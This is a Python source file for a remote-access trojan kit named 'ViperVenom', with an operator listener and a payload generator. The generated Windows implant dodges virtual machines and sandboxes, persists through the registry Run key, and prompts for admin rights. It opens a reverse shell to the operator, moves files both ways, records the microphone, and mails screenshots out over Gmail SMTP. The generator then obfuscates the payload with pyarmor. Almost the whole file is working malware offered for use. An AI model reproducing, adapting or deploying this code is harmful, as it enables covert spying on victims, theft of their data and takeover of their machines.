    #Eclipse Public License - v 2.0
    #THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
    #PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
    #OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.





import socket
import time
import platform
import os
import threading
from typing import Set
from scipy.io.wavfile import *
import base64
import random, string
from colorama import Fore, Back, Style
# =====================================================> Clears Terminal
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")
Clear()

time.sleep(2)

# =====================================================> Banner
def Banner():
    
    print(f"""{Fore.CYAN};cll:::;;cc:;'';;;;;''..''.',;;,'..'...'.......',;:;,'........,,,''',,;,'...............'................................,,,;cc;,:
;::;;::;,,;::;;;:::;;;,'..',,,,''...''''''''....',;;,''','''...'''..',;:,'... ....................'......''..... .......''',,::;;;
:::;;;,;:c:;::;,;:::::::;,::;'....',;,'''''.....',,'........'',,,,,,,,,;:;;,'........ .   .....  ..'.....'........... ......',;:;;
:;',,'.':cc:,,;;',;:;,,::;;;;,'...'''.......';c:;;;,'''''''',,;;::::c::c::::;;,'... ........................  .........'......';;'
::;;,,;,',::,.',,,;::;'',;,''............';cccl:;,,,''',''''',,;;::;:::::,',;::;,,'..........................  .......''........''
:col;,;:;,',;,'',,.',;;'',,'..........,coodolcc::,'',,,,..,,''',;;;;;;;::;;::;;::cccc:'..  ... ... ..  ..   ...      ....'.. ...''
l:;cc:,,;;'';;,......';,.....   .....:xkxdoolc;,,;,'',,,'',,,,,''',;;'';;;::;;:clllllodc.    ..      .      ...        ....    ..'
ol::c;'.',''''..  ....','....... ...'lxdddoollc:,,;;,,,'''',,,,,,,,,,,,,,,,;::ccc:cccodxl'                  ....      .. ...    ..
,::,,;,'';;,...   ..................,odxxxdc,',:c:cc:;;,'',;:;;;;,,,;;,,;,,::cll:,,;,:ooxl. .                   ......   ......   
.;c;'...';:;.       .....'..........:xddxddl,,,;cccllcc:,,,;;;:;;;;;;,'',c:;:lolol'.''codo,.       ..       .     .....  .. ...   
.,c:......''.....    ...............lxdddddolodkOxloddl:,...''''''''',;;:,.'cddokkl;,;ddod:.      ....                    .       
..,;'.'',,',,,.....  ..............,dkkkxxxkkkkOK0o:clooc:,,,'.. ...''';;'..cclxddkxdxkxddc.        ...                 .         
;;.,;'',;:'.'......................ck0OOOOO00OOkOOdclol:co:,..       ..,;;',oxol;lO0Okxdkxo'        ..           .      ..     .. 
';'.;,..:c,....... ............''.'lO000000000dcoko:ooc;:;,,.  ....  .,;cc:;lkkl::lxOkkOxol,.    ..            . .. ...... ..  ...
,;'.,'..',;........................;oO00000OOOxoodoc:llc:;,,...   .......,:lcclcclccccoxxdo,       ..    ......... .. ....      ..
',,..','..'...'........''...........'cxkxxkkkOOkddooccc;'.',..      .,,'. ...,;;;;::::clllc.                                      
'';'.,:'.'...,'.'''....''.............:c:;;;;;,,'....    .ll.       .od;     ......''',;,,.                                       
,:c;'''','..''..'''...''..............,:;'..             .c:         :c.           ....::.                                        
;;:;'.',,'.''...''..........         ..,'...              ,,         ,;             ..:d;                                         
:;,'.','..........                     .....              ..         ''       .    ..,dd'                                         
;,.....                                 ....  ....        ..         ..     ........'ckl.                                         
.                                       .'...........      . .......        .......'ckx'                                          
                                         .'.............  .....   ...   ...........'lx;                                           
                                         .'''.................    .................;d:                                            
                                          .,,,.................  .................;oc.                                            
,..                                        .,;,'...............  ................;do.                                             
',,..                                       ..,,'..............  ..............':ol.                                              
......''..                                    .'''.............  .............,coc.                                               
.......''..                                     ...............  ...........';ll,                                                 
........',...''.....                              .............  .........';:c;.                                                  
..........'...',,''.'''..                           ...........  ......'',;;'.                                                    
......''...',...,;'..,;:;'.....                       ........   ...'..'...                                                       
........,'..,;,..';,..';:;'',;,..,,....                           .....                                                           
 ........'....','....';;:::,...,,,:ccc,'''.......                                                                                 
...............,;;'..,:;'.',,'.,cccccc;,,,,',;;,''''......                                                                        
  ....  ...'.....,,....,,'',;:;,:lol:;,,,;,'..'',,'....','........                                                                
... .......','...':;,..';,,,;:c::;;::;,...,;'...,;,'....,;,....;,'...''..    


""")
    print(f"{Fore.BLUE}             The quieter you become, the more you can hear, ViperVenom", )
    print()
Banner()
# =====================================================> Main Menu


def Menu():
    print(f"""{Fore.CYAN}
1 | Start Handler Listener
""",)
    print(f"""{Fore.RED}
2 | Generate ViperVenom Payload
""",)
    print()
# =====================================================> Vars

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
BUFFER_SIZE = 1024
global ListenerHost
global ListenerPort
# =====================================================> Backdoor Listener

def Listener():
    ListenerHost = "0.0.0.0"
    ListenerPort = 443
    while True:
        landingHandler = input(f"{Fore.WHITE}/ViperVenom/ > ")
        if landingHandler == "show payloads":
            print(f'''{Fore.CYAN}
            ———————————————————————————————————————————————————————————————————————————————
            Available Payloads Any Windows: \n
            1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.\n
            ———————————————————————————————————————————————————————————————————————————————
            ''')
        if landingHandler == "use windows/vipervenom/tcp/payload" or landingHandler ==  "use 1":
                while True:
                    firstHandler = input(f"{Fore.RED}(Listener){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                    if firstHandler[:8] == "set host":
                        ListenerHost = firstHandler[9:]
                    if firstHandler[:8] == "set port":
                        ListenerPort = firstHandler[9:]
                    if firstHandler == "show host":
                        print(f"LHOST={ListenerHost}")
                    if firstHandler == "show port":
                        print(f"LPORT={ListenerPort}")
                    if firstHandler == "use 2":
                        PayloadGenerator()
                    if firstHandler == "options":
                        print(f"LHOST={ListenerHost}")
                        print(f"LPORT={ListenerPort}")
                    if firstHandler == "run":
                            s.bind((ListenerHost, int(ListenerPort)))
                            s.listen(99)
                            time.sleep(1)
                            print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Starting Listener...")
                            time.sleep(1)
                            print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Listener Started on {ListenerHost}:{ListenerPort}, {Fore.RED}Waiting for Connections...")
                            conn, addr = s.accept()
                            with conn:
                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Recived Connection From: {addr}")
                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Connecting to Device.")
                                time.sleep(1)
                                while True:


                                    Handler = input(f"{Fore.RED}({addr[0]}){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                                    if Handler == "clear":
                                        if platform.system() == "Linux":
                                            os.system('clear')
                                        else:
                                            os.system("cls")
                                    elif Handler == "screenshot":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "exit":
                                        conn.send(Handler.encode("utf-8"))
                                        print(f"{Fore.GREEN}[*] Exiting From Active Session...")
                                        time.sleep(3)
                                        conn.close()
                                    elif Handler == "mic record":
                                        conn.send(Handler.encode("utf-8"))
                                        letters = string.ascii_letters
                                        with open(f'{random.choice(letters)}.wav','wb') as f:
                                            while True:
                                                l = conn.recv(1024)
                                                if not l: break
                                                f.write(l)
                                            if Handler.lower() == 'quit':
                                                break
                                    elif Handler == "restart":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "shutdown":
                                        conn.send(Handler.encode("utf-8"))
                                    elif Handler == "shell":
                                        conn.send(Handler.encode("utf-8"))
                                        cwd = 'Shell'
                                        r = conn.recv(5120).decode('utf-8')
                                        if ('dir:' in r):
                                            cwd = r[4:]
                                        while True:
                                            command = input(str(cwd) + "> ")
                                            if 'terminate' in command:
                                                conn.send('terminate'.encode('utf-8'))
                                                conn.close()
                                                break
                                            elif 'download' in command:
                                                conn.send(command.encode('utf-8'))
                                                file_name = conn.recv(1024).decode('utf-8')
                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Grabbing [" + file_name + "]...")
                                                conn.send('OK 200'.encode('utf-8'))
                                                file_size = conn.recv(1024).decode('utf-8')
                                                conn.send('OK 200'.encode('utf-8'))
                                                print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Total: " + str(int(file_size)/1024) + " KB")
                                                with open(file_name, "wb") as file:
                                                    c = 0
                                                    start_time = time.time()
                                                    while c < int(file_size):
                                                        data = conn.recv(1024)
                                                        if not (data):
                                                            break
                                                        file.write(data)
                                                        c += len(data)
                                                    end_time = time.time()
                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Grabbed. Total time: ", end_time - start_time)
                                            elif 'upload' in command:
                                                conn.send(command.encode('utf-8'))
                                                file_name = command[9:]
                                                file_size = os.path.getsize(file_name)
                                                conn.send(file_name.encode('utf-8'))
                                                print(conn.recv(1024).decode('utf-8'))
                                                conn.send(str(file_size).encode('utf-8'))
                                                print(f"{Fore.WHITE}[{Fore.GREEN}*{Fore.WHITE}] Getting Response")
                                                print(conn.recv(1024).decode('utf-8'))
                                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Transferring [" + str(file_size/1024) + "] KB...")
                                                with open(file_name, "rb") as file:
                                                    c = 0
                                                    start_time = time.time()
                                                    while c < int(file_size):
                                                        data = file.read(1024)
                                                        if not (data):
                                                            break
                                                        conn.sendall(data)
                                                        c += len(data)
                                                    end_time = time.time()
                                                    print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] File Transferred. Total time: ", end_time - start_time)
                                            elif (len(command.strip()) > 0):
                                                conn.send(command.encode('utf-8'))
                                                r = conn.recv(5120).decode('utf-8')
                                                if ('dir:' in r):
                                                    cwd = r[4:]
                                                else:
                                                    print (r)


                                    




def PayloadGenerator():
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    clientHOST = local_ip
    clientPORT = 443
    SetYourEmail = "revise7@example.com"
    SetYourEmailPassword = "P@$$W0RD_ON3"
    SetFileName = "NULL.py"
    micrecordsec = 600
    setSleep = 0
    while True:
        landingHandler = input(f"{Fore.WHITE}/ViperVenom/ > ")
        if landingHandler == "show payloads":
            print(f'''{Fore.CYAN}
            ———————————————————————————————————————————————————————————————————————————————
            Available Payloads Any Windows: \n
            1 | generator/vipervenom/tcp/payload | Best Option for Windows Exploitation.\n
            ———————————————————————————————————————————————————————————————————————————————
            ''')
        if landingHandler == "use generator/vipervenom/tcp/payload" or landingHandler == "use 1":
            while True:
                firstHandler = input(f"{Fore.RED}(Generator){Fore.WHITE} Windows/ViperVenom/TCP/Payload > ")
                if firstHandler[:8] == "set host":
                    clientHOST = firstHandler[9:]
                if firstHandler[:8] == "set port":
                    clientPORT = firstHandler[9:]
                if firstHandler == "show host":
                    print(f"HOST={clientHOST}")
                if firstHandler == "show port":
                    print(f"PORT={clientPORT}")
                if firstHandler[:13] == "set gmailaddr":
                    SetYourEmail = firstHandler[14:]
                if firstHandler == "show gmailaddr":
                    print(f"GAMILADDR={SetYourEmail}")
                if firstHandler[:13] == "set gmailpass":
                    SetYourEmailPassword = firstHandler[14:]
                if firstHandler == "show gmailpass":
                    print(f"GAMILPASS={SetYourEmailPassword}")
                if firstHandler[:12] == "set filename":
                    SetFileName = firstHandler[13:]
                if firstHandler == "show filename":
                    print(f"FILENAME={SetFileName}")
                if firstHandler[:13] == "set micrecord":
                    micrecordsec = firstHandler[14:]
                if firstHandler == "show micrecord":
                    print(f"MICRECORD={micrecordsec}")
                    setSleep = firstHandler[13:]
                if firstHandler[:9] == "set sleep":
                    setSleep = firstHandler[10:]
                if firstHandler == "show sleep":
                    print(f"SLEEP={setSleep}")
                if firstHandler == "use 1":
                    Listener()
                if firstHandler == "options":
                    print(f"HOST={clientHOST}")
                    print(f"PORT={clientPORT}")
                    print(f"GAMILADDR={SetYourEmail}")
                    print(f"GAMILPASS={SetYourEmailPassword}")
                    print(f"FILENAME={SetFileName}")
                    print(f"MICRECORDSECONDS={micrecordsec}")
                    print(f"SLEEP={setSleep}")





                    
                    
                    
                    if firstHandler == "generate":
                        print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Generating Payload")
                        time.sleep(1)
                        print(".")
                        time.sleep(1)
                        print("..")
                        time.sleep(1)
                        print("...")
                        with open(SetFileName, "w") as malfile:
                            malfile.write(
                                f'''                    
#Eclipse Public License - v 2.0
#THE ACCOMPANYING PROGRAM IS PROVIDED UNDER THE TERMS OF THIS ECLIPSE
#PUBLIC LICENSE ("AGREEMENT"). ANY USE, REPRODUCTION OR DISTRIBUTION
#OF THE PROGRAM CONSTITUTES RECIPIENT'S ACCEPTANCE OF THIS AGREEMENT.
from PIL import ImageGrab
import socket
import smtplib
import base64
import os
import platform
import sounddevice
from scipy.io.wavfile import write
import time
import random, string
import psutil
import subprocess
import winreg as reg
from colorama import Fore, Back, Style
import shutil
import ctypes
import sys
def vmServ():
    vmproc1 = "vmsrvc.exe"
    vmproc2 = "vmusrvc.exe"
    vmproc3 = "vmtoolsd.exe"
    vmproc5 = "vboxtry.exe"
    vmproc6 = "df5serv.exe"
    vmproc7 = "vboxservice.exe"
    for proc in psutil.process_iter():
        try:
            if proc.name().lower() == vmproc1.lower() or proc.name().lower() == vmproc2.lower() or proc.name().lower() == vmproc3.lower() or proc.name().lower() == vmproc5.lower() or proc.name().lower() == vmproc6.lower() or proc.name().lower() == vmproc7.lower():
                exit()
        except WindowsError:
            vmpath1 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmci.sys")
            vmpath2 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmhgfs.sys")
            vmpath3 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmmouse.sys")
            vmpath4 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmscsi.sys")
            vmpath5 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmusemouse.sys")
            vmpath6 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmx_svga.sys")
            vmpath7 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\vmxnet.sys")
            vmpath8 = os.path.exists(f"{os.getenv('SYSTEMDRIVE')}\\windows\\system32\\drivers\\VBoxMouse.sys")
            if vmpath1 == True or vmpath2 == True or vmpath3 == True or vmpath4 == True or vmpath5 == True or vmpath6 == True or vmpath7 == True or vmpath8 == True:
                exit()
vmServ()
letters = ''.join(random.choice(string.ascii_letters) for l in range(16))
letters = time.sleep(10)
letters
def regeditPersist(f_name, path): 
    address=os.path.join(path, f_name)  
    key = reg.HKEY_CURRENT_USER 
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address) 
    reg.CloseKey(open)
BUFFER_SIZE = 1024
clientHOST = "{clientHOST}"
clientPORT = {clientPORT}
def connection():
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((clientHOST, clientPORT))
    s.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 10000, 3000))
    while True:
        Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
        if Handler_DATA == "screenshot":
            screenshot = ImageGrab.grab()
            file = "{''.join(random.choice(string.lowercase) for l in range(10))}.jpg"
            screenshot.save(file)
            f = open(file, 'rb')
            data=f.read()
            data=base64.b64encode(data)
            f.close()
            os.remove(file)
            smtp = smtplib.SMTP('smtp.gmail.com', 587)
            smtp.starttls()
            smtp.login("{SetYourEmail}", "{SetYourEmailPassword}")
            message = data
            smtp.sendmail("{SetYourEmail}", "{SetYourEmail}", message)
            smtp.quit()
        elif Handler_DATA == "mic_record":
            frames = 44100
            seconds = {micrecordsec}
            channel = 1
            record = sounddevice.rec(int(seconds*frames), samplerate=frames, channels=channel)
            sounddevice.wait()
            file = f"{''.join(random.choice(string.lowercase) for l in range(10))}.wav"
            write(file, frames, record)
            with open(file, 'rb') as f:
                for l in f: s.sendall(l)
                time.sleep(10)

                os.remove(file)
        elif Handler_DATA == "restart":
            if platform.system() == "Windows":
                os.system("shutdown -t 0 -r -f")
            else:
                os.system("reboot")
        elif Handler_DATA == "shutdown":
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1")
            else:
                os.system("shutdown now")
        elif Handler_DATA == "exit":
            s.close()
            exit()
        elif Handler_DATA == "shell":
            cwd = os.getcwd()
            s.send(("dir:" + str(cwd)).encode('utf-8'))
            while True:
                try:
                    command = s.recv(2048).strip().decode('utf-8')
                    if 'terminate' in command:
                        s.close()
                        break 
                    elif command.startswith('download'):
                        file_name = command[5:]
                        file_size = os.path.getsize(file_name)
                        s.send(file_name.encode('utf-8'))
                        s.recv(1024).decode('utf-8')
                        s.send(str(file_size).encode('utf-8'))
                        s.recv(1024).decode('utf-8')
                        with open(file_name, "rb") as file:
                            c = 0
                            start_time = time.time()
                            while c < file_size:
                                data = file.read(1024)
                                if not (data):
                                    break
                                s.sendall(data)
                                c += len(data)
                                end_time = time.time()
                    elif 'upload' in command:
                        file_name = s.recv(1024).decode('utf-8')
                        s.send('OK'.encode('utf-8'))
                        file_size = s.recv(1024).decode('utf-8')
                        s.send('OK'.encode('utf-8'))
                        with open(file_name, "wb") as file:
                            c = 0
                            start_time = time.time()
                            while c < int(file_size):
                                data = s.recv(1024)
                                if not (data):
                                    break
                                file.write(data)
                                c += len(data)
                            end_time = time.time()
                    elif command.startswith('cd '):
                        dir = command[3:]
                        try:
                            os.chdir(dir)
                        except:
                            os.chdir(cwd)
                        cwd = os.getcwd()
                        s.send(("dir:" + str(cwd)).encode('utf-8'))
                    elif command.startswith('startup'):
                        file_name = command[8:]
                        pth = os.getcwd()
                        try:
                            AddToStartup(file_name, pth)
                            s.send(f"Hooked".encode('utf-8'))
                        except Exception as e:
                            s.send(str(e).encode('utf-8'))
                    else:
                        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        out = CMD.stdout.read()
                        err = CMD.stderr.read()
                        s.send(out)
                        s.send(err)
                        if (out == b'' and err == b''):
                            s.send("OK".encode('utf-8'))
                except Exception as e:
                    s.send(str(e).encode('utf-8'))
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
if is_admin():
    connection()
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
is_admin()
def coreChk():
    cpuChk = psutil.cpu_count(logical=False)
    if cpuChk<1:
        exit()
    if cpuChk<2:
        exit()
    if cpuChk<3:
        exit()
    else:
        connection()
coreChk()
def diskChk():
    avgDiskChk = shutil.disk_usage("/")
    div = (avgDiskChk // (2**30))
    if div>59:
        exit()
    if div>60:
        exit()
    if div>65:
        exit()
    if div>120:
        exit()
    if div>119:
        exit()
    else:
        connection()
diskChk()
''')
                            if platform.system() == "Windows":
                                print(f"{Fore.WHITE}[{Fore.GREEN}+{Fore.WHITE}] Converting Code to a Shellcode, Please Wait")
                            time.sleep(1)
                            print(".")
                            time.sleep(1)
                            print("..")
                            time.sleep(1)
                            print("...")
                            if platform.system() == "Windows":
                                os.system(f"pyarmor obfuscate {SetFileName}")
                            else:
                                continue
                            time.sleep(1)
                        print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Payload Generated, Payload is Ready.")
                        time.sleep(1)
                        #os.remove(setFileName)
                        redirectListener = input("{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] Would You Like to Start Listener? ", "cyan")
                        if redirectListener == "yes":
                            Listener()
                        if redirectListener == "y":
                            Listener()
                        if redirectListener == "no":
                            exit()
                        if redirectListener == "n":
                            exit()


# =====================================================> Menu Option
while True:
    des = input(f"{Fore.RED}Landing/ViperVenom/ > {Fore.WHITE}",)
    if des == "use 1":
        Listener()
    if des == "use 2":
        PayloadGenerator()
    if des == "list show":
        Menu()
    if des == "list":
        Menu()
    if des == "show list":
        Menu()

else:
    print(f"{Fore.WHITE}[{Fore.BLUE}*{Fore.WHITE}] ERROR Invaild Argument, Exiting...")
    while True:
        break
